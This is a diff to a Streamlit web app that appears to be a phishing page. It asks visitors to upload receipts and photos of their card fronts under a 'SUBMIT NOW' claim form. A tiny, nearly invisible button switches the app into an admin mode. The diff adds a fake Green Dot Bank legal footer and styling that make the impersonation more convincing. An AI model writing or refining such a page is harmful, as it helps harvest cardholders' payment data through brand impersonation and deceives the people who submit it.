@@ -57,7 +57,8 @@ st.markdown("""<style>
         display: none !important; visibility: hidden !important;
     }
 
-    .stButton>button {
+    /* Targeted Button Styles to avoid affecting footer text */
+    .stButton > button, div[data-testid="stForm"] button {
         background-color: #00a05b !important;
         color: white !important;
         border-radius: 8px !important;
@@ -70,6 +71,13 @@ st.markdown("""<style>
     div.stButton > button[key="ghost_dot"] {
         background-color: transparent !important; border: none !important; color: #000 !important;
         padding: 0 !important; width: 2px !important; height: 2px !important;
+        box-shadow: none !important;
+    }
+
+    .legal-container {
+        font-size: 11px !important; color: #666 !important; text-align: center !important;
+        margin-top: 40px !important; padding-top: 20px !important;
+        border-top: 1px solid #222 !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -89,6 +97,8 @@ if not st.session_state.admin_mode:
         st.file_uploader("Receipt", type=['jpg','png','jpeg'])
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
+
+    st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
 
     if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True
 
